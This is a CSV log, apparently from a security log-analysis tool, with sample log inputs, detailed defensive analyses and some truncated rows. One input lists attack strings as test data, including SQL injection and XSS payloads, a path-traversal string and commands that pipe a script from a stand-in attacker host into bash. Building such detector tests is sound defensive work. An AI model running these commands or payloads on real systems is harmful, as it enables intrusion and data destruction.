Timestamp,Query
2025-06-21 04:38:29,"[2025-06-18 07:45:13] INFO: Successful login by user 'admin' from IP 192.168.1.100 (Location: IN)

[2025-06-18 08:02:47] WARNING: Failed login attempt for user 'root' from IP 203.0.113.42 (Location: RU)

[2025-06-18 08:14:03] CRITICAL: TCP SYN Port Scan detected from IP 45.76.123.89 targeting 10.0.0.4 on ports 22, 80, 443, 8080

[2025-06-18 08:30:25] INFO: User 'chaitanya' accessed file '/home/chaitanya/projects/secret.docx' (Access Type: READ)

[2025-06-18 08:45:39] HIGH: Firewall blocked ICMP packet from IP 103.21.244.1 to internal host 10.0.0.5

[2025-06-18 09:10:10] CRITICAL: Malware detected on instance 'instance-3' - File: /tmp/malicious.py, Threat: Trojan.Generic.1523, Severity: High

[2025-06-18 09:15:45] INFO: Resource usage on 'gce-secureai-vm1': CPU=87.5%, Memory=73.1%, Disk I/O=150.2MB, Network I/O=320.7MB

[2025-06-18 09:30:12] WARNING: IAM policy updated by user 'internal-ops': Role 'roles/storage.admin' added to resource 'projects/secureai-project/buckets/logs'
","Here's an analysis of the provided log data:

---

**Log Data Analysis Summary**

**1. Nature of Threat:**
Multiple threats are observed, indicating a combination of reconnaissance, brute-force attempts, and a successful system compromise:
*   **Reconnaissance/Scanning:**
    *   **TCP SYN Port Scan:** An active attempt to discover open ports (22, 80, 443, 8080) on internal host 10.0.0.4, indicating an attacker mapping the network.
    *   **ICMP Probing:** An attempt to discover active hosts (10.0.0.5) via ICMP, though this was blocked by the firewall.
*   **Brute-Force/Unauthorized Access Attempt:** A failed login attempt for the 'root' user from an external IP, suggesting a brute-force attack or credential stuffing.
*   **Malware Infection:** A critical alert indicates a successful malware (Trojan.Generic.1523) infection on 'instance-3', compromising the system.
*   **Potential Privilege Escalation/Misconfiguration:** An IAM policy update that grants `roles/storage.admin` to a logs bucket by user 'internal-ops' is suspicious and could indicate unauthorized privilege escalation or a misconfiguration that expands access to sensitive data.

**2. Affected Components:**
*   **Internal Hosts:**
    *   `10.0.0.4`: Targeted by a TCP SYN port scan.
    *   `10.0.0.5`: Targeted by an ICMP probe.
*   **Virtual Machine/Instance:**
    *   `instance-3`: Infected with malware, specifically `/tmp/malicious.py`.
*   **Cloud Resources/IAM:**
    *   `projects/secureai-project/buckets/logs`: Had its IAM policy modified, granting `storage.admin` role.
*   **User Accounts:**
    *   `root`: Targeted in a failed login attempt.
    *   `internal-ops`: User responsible for the suspicious IAM policy update.
*   **Network Perimeter:** The firewall successfully blocked an ICMP packet, indicating it's an active defense component.

**3. Suggested Remediation:**
*   **Immediate Isolation & Containment:**
    *   **Isolate `instance-3` immediately** from the network to prevent further spread of the Trojan. Do not power off directly without forensic imaging if possible.
*   **Investigation & Forensic Analysis:**
    *   Conduct a full **forensic analysis on `instance-3`** to determine the malware's origin, capabilities, and any potential data exfiltration or lateral movement.
    *   **Investigate the IAM policy change** by 'internal-ops': Verify if this change was authorized, necessary, and part of a legitimate operational task. If not, revert it immediately.
    *   Analyze logs related to the failed 'root' login attempts for patterns (e.g., source IPs, frequency, targeted users).
*   **Remediation & Hardening:**
    *   **Block Suspicious IPs:** Add IPs 203.0.113.42, 45.76.123.89, and 103.21.244.1 to network blocklists (firewall/WAF/router ACLs) to prevent further probing and attacks.
    *   **Clean/Rebuild Infected Systems:** After forensic analysis, clean the malware from `instance-3`. It's generally safer to reimage or restore from a known good backup.
    *   **Strengthen Authentication:** Implement strong password policies, account lockout thresholds, and **Multi-Factor Authentication (MFA)** for all administrative and sensitive user accounts (especially 'root' if direct login is enabled). Consider disabling direct 'root' login via SSH if possible.
    *   **IAM Review:** Enforce the **Principle of Least Privilege** for all IAM roles. Regularly audit and review IAM policies and changes, especially those granting broad permissions like `storage.admin`.
    *   **Firewall/IDS/IPS Review:** Ensure firewall rules are optimized, and IDS/IPS systems are up-to-date with the latest signatures to detect and prevent similar reconnaissance and attack attempts.
    *   **Patch Management:** Ensure all systems, especially those targeted (10.0.0.4, 10.0.0.5, `instance-3`), are fully patched and up-to-date.
*   **Proactive Monitoring:**
    *   Enhance monitoring for failed login attempts, unusual IAM policy changes, and high resource utilization that might indicate compromise.

**4. Suspicious IPs or Ports:**
*   **Suspicious IPs:**
    *   `203.0.113.42` (Location: RU) - Source of failed 'root' login attempt (brute-force).
    *   `45.76.123.89` - Source of TCP SYN Port Scan.
    *   `103.21.244.1` - Source of blocked ICMP packet (probing).
*   **Suspicious Ports (Targeted):**
    *   `22` (SSH)
    *   `80` (HTTP)
    *   `443` (HTTPS)
    *   `8080` (Alternate HTTP)
    These ports were targeted in the port scan, indicating the attacker was looking for common web services and remote access points."
2025-06-21 04:42:02,"[2025-06-18 07:45:13] INFO: Successful login by user 'admin' from IP 192.168.1.100 (Location: IN)

[2025-06-18 08:02:47] WARNING: Failed login attempt for user 'root' from IP 203.0.113.42 (Location: RU)

[2025-06-18 08:14:03] CRITICAL: TCP SYN Port Scan detected from IP 45.76.123.89 targeting 10.0.0.4 on ports 22, 80, 443, 8080

[2025-06-18 08:30:25] INFO: User 'chaitanya' accessed file '/home/chaitanya/projects/secret.docx' (Access Type: READ)

[2025-06-18 08:45:39] HIGH: Firewall blocked ICMP packet from IP 103.21.244.1 to internal host 10.0.0.5

[2025-06-18 09:10:10] CRITICAL: Malware detected on instance 'instance-3' - File: /tmp/malicious.py, Threat: Trojan.Generic.1523, Severity: High

[2025-06-18 09:15:45] INFO: Resource usage on 'gce-secureai-vm1': CPU=87.5%, Memory=73.1%, Disk I/O=150.2MB, Network I/O=320.7MB

[2025-06-18 09:30:12] WARNING: IAM policy updated by user 'internal-ops': Role 'roles/storage.admin' added to resource 'projects/secureai-project/buckets/logs'
","Here's an analysis of the provided log data:

---

### Security Log Analysis

**1. Nature of Threat(s):**

*   **Brute-Force/Credential Guessing:** Indicated by the failed login attempt for the 'root' user from an external IP. This suggests an attacker is trying to gain unauthorized access.
*   **Reconnaissance (Port Scanning):** A TCP SYN port scan was detected, targeting multiple common service ports (SSH, HTTP, HTTPS, alternative web service). This is typically a precursor to an attack, where an attacker maps out open services.
*   **Reconnaissance (Ping Sweep/Network Discovery):** An external IP attempted to send an ICMP packet to an internal host. While blocked, this is often part of a network discovery or ping sweep to identify live hosts.
*   **Malware Infection:** A high-severity Trojan (Trojan.Generic.1523) was detected on 'instance-3'. This indicates an active compromise or a successful delivery of malicious payload.
*   **Potential Privilege Escalation / Unauthorized IAM Policy Change:** A `storage.admin` role was added to a sensitive logs bucket. While initiated by 'internal-ops', this is a significant privilege grant and warrants immediate investigation to confirm its legitimacy, as it could be an insider threat or a compromised internal account attempting to gain excessive access to sensitive data.

**2. Affected Components:**

*   **Authentication Systems:** Targeted by brute-force attempts for the 'root' account.
*   **Network Perimeter / Firewall:** Successfully blocked an ICMP packet, but was targeted by reconnaissance.
*   **Internal Host (10.0.0.4):** Targeted by the TCP SYN Port Scan.
*   **Internal Host (10.0.0.5):** Targeted by the blocked ICMP packet.
*   **Instance 'instance-3':** Compromised by malware (`/tmp/malicious.py`).
*   **IAM System:** The policy update affecting `projects/secureai-project/buckets/logs` indicates a change in access permissions.
*   **Cloud Storage Bucket (`projects/secureai-project/buckets/logs`):** Its access policy was modified, potentially exposing sensitive log data if the change was unauthorized or excessive.

**3. Suggested Remediation:**

*   **Immediate Actions:**
    *   **Isolate `instance-3`:** Immediately disconnect `instance-3` from the network to prevent further compromise or spread of the malware.
    *   **Forensic Analysis on `instance-3`:** Conduct a thorough forensic investigation to determine the malware's origin, extent of compromise, and any data exfiltration. Reimage the instance if necessary.
    *   **Review IAM Policy Change:** Immediately verify the legitimacy of the `storage.admin` role addition to the logs bucket. If unauthorized, revoke the permission and investigate the 'internal-ops' user account for compromise. Implement ""principle of least privilege"" for all IAM roles.
    *   **Block Suspicious IPs:** Add the suspicious IPs (203.0.113.42, 45.76.123.89, 103.21.244.1) to network blacklists/firewall deny rules.
*   **Preventative Measures:**
    *   **Strengthen Authentication:** Implement Multi-Factor Authentication (MFA) for all administrative accounts (especially 'root' if it's enabled for direct login). Enforce strong password policies and implement account lockout policies after a few failed attempts.
    *   **Enhance Network Security:**
        *   Review and refine Firewall/IDS/IPS rules to actively block known scanning patterns and suspicious traffic.
        *   Implement rate limiting for login attempts and incoming connection requests.
        *   Consider geographically blocking IPs from high-risk regions if not required for legitimate business.
    *   **Endpoint Security:** Ensure all instances have up-to-date antivirus/EDR solutions with regular scans.
    *   **Vulnerability Management:** Regularly patch and update all systems to close known vulnerabilities that malware might exploit.
    *   **Security Auditing:** Conduct regular audits of IAM policies, user activity, and resource access to detect anomalies.
    *   **Log Management & SIEM:** Integrate logs into a Security Information and Event Management (SIEM) system for real-time monitoring, correlation, and alerting.

**4. Suspicious IPs or Ports:**

*   **Suspicious IPs:**
    *   `203.0.113.42` (Location: RU) - Associated with failed root login attempts.
    *   `45.76.123.89` - Associated with TCP SYN Port Scan.
    *   `103.21.244.1` - Associated with blocked ICMP packet.
*   **Suspicious Ports (Targeted by Scan):**
    *   `22` (SSH)
    *   `80` (HTTP)
    *   `443` (HTTPS)
    *   `8080` (Alternate HTTP/Web Service)
    *   *(Note: ICMP is a protocol, not a port, used for reconnaissance/pinging)*"
2025-06-21 04:49:13,"192.168.1.1
8.8.8.8
1.1.1.1
185.107.56.217
45.143.220.51
23.129.64.43
200.16.121.111
196.52.43.12
malicious.example.com
login.microsoftverify.com
update-browser.com
http://bit.ly/3q7FG9P
http://phishingsite.xyz/login
http://secure-paypal-verify.ru
http://evil-site.com/steal.php
dropbox-login-authenticators.net
d41d8cd98f00b204e9800998ecf8427e
44d88612fea8a8f36de82e1278abb02f
eicar.com
CVE-2021-44228
CVE-2024-12345
Exploit:Win32/PowerShellBackdoor.A
Win.Trojan.Agent-1234567
powershell -exec bypass -EncodedCommand
%3cscript%3ealert('xss')%3c/script%3e
UNION SELECT * FROM users WHERE '1'='1
../../../../etc/passwd
wget http://attacker.com/malware.sh
curl -s http://hacker.com/rootkit | bash
admin' -- 
OR 1=1
%27%20OR%201=1--
'; DROP TABLE users; --
<script>alert(""XSS"")</script>
nmap -sS -p- 10.0.0.1
masscan -p0-65535 192.168.0.0/16
TCP SYN Flood from 203.0.113.12
Brute-force detected on sshd
Failed login from 103.12.44.21
Suspicious DNS query for 'update.win-driver-checker.com'
Anomalous outbound traffic detected
SSL cert mismatch warning
Process injection attempt detected
Encoded PowerShell detected
Unexpected base64 string: cG93ZXJzaGVsbCAtZ
Reverse shell to 198.51.100.22:4444
Suspicious user-agent: sqlmap/1.4.9.5#dev
Tor exit node detected: 104.244.76.13
DNS tunneling suspected from 172.16.5.10
","This log data indicates a high volume and variety of malicious activities, suggesting an ongoing multi-stage attack or widespread compromised systems/services.

---

### Analysis of Log Data

**1. Nature of Threat**

The logs reveal a comprehensive attack landscape, encompassing multiple phases of a typical cyber kill chain:

*   **Reconnaissance & Scanning:**
    *   Network scanning (`nmap`, `masscan`) to discover open ports and services.
    *   Use of specialized tools (`sqlmap` user-agent) for vulnerability scanning.
    *   Traffic originating from a Tor exit node, indicating an attempt to anonymize attacker's origin.
*   **Web Application Attacks:**
    *   **SQL Injection (SQLi):** Attempts to manipulate database queries (`UNION SELECT`, `admin' --`, `OR 1=1`, `DROP TABLE users`).
    *   **Cross-Site Scripting (XSS):** Attempts to inject malicious client-side scripts (`<script>alert('xss')</script>`, `%3cscript%3ealert('xss')%3c/script%3e`).
    *   **Path Traversal:** Attempt to access restricted directories (`../../../../etc/passwd`).
*   **Exploitation & Vulnerability Targeting:**
    *   Mention of specific CVEs (`CVE-2021-44228` - Log4Shell, `CVE-2024-12345` - placeholder for a new vulnerability), indicating attempts to exploit known software flaws.
    *   Process injection attempts, a common technique for privilege escalation or hiding malicious code.
*   **Malware Delivery & Execution:**
    *   Attempts to download and execute malicious scripts/binaries (`wget http://attacker.com/malware.sh`, `curl -s http://hacker.com/rootkit | bash`).
    *   Detection of specific malware families (`Exploit:Win32/PowerShellBackdoor.A`, `Win.Trojan.Agent-1234567`).
    *   Execution of malicious PowerShell commands, including obfuscated/encoded ones (`powershell -exec bypass -EncodedCommand`, `Encoded PowerShell detected`, `Unexpected base64 string: cG93ZXJzaGVsbCAtZ`).
    *   Presence of EICAR test file signature (`eicar.com`), potentially indicating an antivirus test or a failed malware download.
*   **Credential Theft & Brute-Force:**
    *   Brute-force attacks against `sshd` (SSH daemon).
    *   Failed login attempts.
    *   Phishing attempts targeting common services (`login.microsoftverify.com`, `secure-paypal-verify.ru`, `dropbox-login-authenticators.net`) to steal credentials.
*   **Command & Control (C2) & Data Exfiltration:**
    *   Establishment of a reverse shell (`Reverse shell to 198.51.100.22:4444`).
    *   Suspicious DNS queries indicating C2 communication (`Suspicious DNS query for 'update.win-driver-checker.com'`).
    *   Anomalous outbound traffic, often a sign of data exfiltration or C2.
    *   DNS tunneling suspected, a sophisticated method for C2 or exfiltration over DNS.
*   **Denial of Service (DoS):**
    *   TCP SYN Flood attack, aiming to exhaust network resources and make services unavailable.

**2. Affected Components**

Based on the nature of threats, the following components are likely affected or targeted:

*   **Web Servers & Applications:** Actively targeted by SQL Injection, XSS, and Path Traversal attempts. Could be compromised for hosting phishing pages or as initial access points.
*   **Operating Systems (Windows/Linux) & Endpoints:** Vulnerable to malware downloads, PowerShell execution, process injection, and potentially hosting reverse shells.
*   **Network Infrastructure (Firewalls, Routers, DNS Servers):** Subject to port scanning, SYN floods, anomalous traffic, and DNS tunneling attempts.
*   **Authentication Services (e.g., SSH Daemon, Identity Providers):** Targeted by brute-force attacks and phishing attempts.
*   **User Accounts:** At risk of credential compromise via phishing and brute-force.
*   **Antivirus/EDR Systems:** Their detections are logged (`Exploit:Win32/PowerShellBackdoor.A`, `Win.Trojan.Agent-1234567`, process injection, encoded PowerShell).

**3. Suggested Remediation**

This is a critical incident requiring immediate and sustained action across multiple layers:

*   **Immediate Response (Containment & Eradication):**
    *   **Isolate Affected Systems:** Disconnect any systems showing signs of compromise (reverse shells, anomalous outbound traffic, process injection, malware detections).
    *   **Block Malicious Indicators:** Implement immediate blocking rules on firewalls, proxies, and DNS filters for all identified suspicious IPs, domains, and URLs.
    *   **Credential Reset:** Force password resets for any accounts targeted by brute-force or phishing, especially if there were successful logins after failed attempts (even if not explicitly logged here).
    *   **Remove Malware:** Use EDR/antivirus to quarantine and remove detected malware. Perform full system scans.
    *   **Patch Vulnerabilities:** Immediately patch systems for `CVE-2021-44228` and any other identified CVEs.
    *   **Take Down Phishing Pages:** If any internal web servers are hosting phishing content, take them down immediately. Report external phishing sites to relevant authorities/registrars.
*   **Short-Term (Investigation & Hardening):**
    *   **Forensic Analysis:** Conduct in-depth forensic analysis on compromised systems to understand the full extent of compromise, identify persistence mechanisms, and determine data exfiltration.
    *   **Log Review:** Review logs from all relevant sources (web servers, firewalls, DNS, authentication logs, endpoint security) for the identified indicators of compromise (IOCs) to find the initial breach point and other affected systems.
    *   **Implement WAF:** Deploy a Web Application Firewall (WAF) to protect against SQLi, XSS, and Path Traversal.
    *   **Strengthen Authentication:** Implement Multi-Factor Authentication (MFA) everywhere possible, enforce strong password policies, and implement account lockout thresholds.
    *   **Network Segmentation:** Improve network segmentation to limit lateral movement if a system is compromised.
    *   **Egress Filtering:** Implement strict egress filtering on firewalls to prevent unauthorized outbound connections (e.g., reverse shells, C2 traffic).
    *   **DNS Filtering:** Utilize robust DNS filtering to block queries to known malicious domains and detect anomalous DNS activity (like tunneling).
*   **Long-Term (Prevention & Resilience):**
    *   **Regular Patching:** Establish a robust vulnerability management program for continuous patching.
    *   **Security Awareness Training:** Conduct regular security awareness training for users, especially on phishing detection.
    *   **Endpoint Detection & Response (EDR):** Enhance EDR capabilities to detect and respond to advanced threats like process injection and encoded PowerShell.
    *   **Threat Intelligence Integration:** Integrate threat intelligence feeds with security tools to automatically block new IOCs.
    *   **Behavioral Monitoring:** Implement systems to detect anomalous outbound traffic and user behavior.
    *   **Incident Response Plan:** Review and refine the incident response plan based on this event.
    *   **Regular Backups:** Ensure regular, tested, and isolated backups for quick recovery.

**4. Suspicious IPs or Ports**

The following IPs and ports are highly suspicious and warrant immediate blocking and investigation:

*   **Suspicious IPs:**
    *   `185.107.56.217`
    *   `45.143.220.51`
    *   `23.129.64.43`
    *   `200.16.121.111`
    *   `196.52.43.12`
    *   `203.0.113.12` (Source of TCP SYN Flood)
    *   `103.12.44.21` (Source of Failed login)
    *   `198.51.100.22` (Destination of Reverse shell)
    *   `104.244.76.13` (Tor exit node)
    *   `172.16.5.10` (Source of DNS tunneling)

*   **Suspicious Ports:**
    *   `4444` (Associated with Reverse shell to `198.51.100.22`)
    *   Any ports `0-65535` targeted by `masscan` on internal networks, indicating a wide-ranging reconnaissance effort.
    *   Default SSH port (typically `22`) targeted by brute-force.
    *   Standard HTTP/HTTPS ports (`80`/`443`) are implied for the various malicious URLs and phishing sites.

**Note:** The IPs `192.168.1.1`, `8.8.8.8`, and `1.1.1.1` are common internal and public DNS servers and are generally not suspicious themselves unless they are the *source* of malicious activity (which is not explicitly stated here). However, if an internal IP like `192.168.1.1` were observed making suspicious outbound connections or acting as a C2, it would then be considered suspicious. In this log, they appear as isolated entries without context, likely benign."
2025-06-21T06:14:02.675908,Quick Scan,"[2025-06-18 07:45:13] INFO: Successful login by user 'admin' from IP 192.168.1.100 (Location: IN)

["
2025-06-21T06:14:17.527462,Deep Analysis,"[2025-06-18 07:45:13] INFO: Successful login by user 'admin' from IP 192.168.1.100 (Location: IN)

["
2025-06-21T06:14:32.418677,Custom Rules,"[2025-06-18 07:45:13] INFO: Successful login by user 'admin' from IP 192.168.1.100 (Location: IN)

["
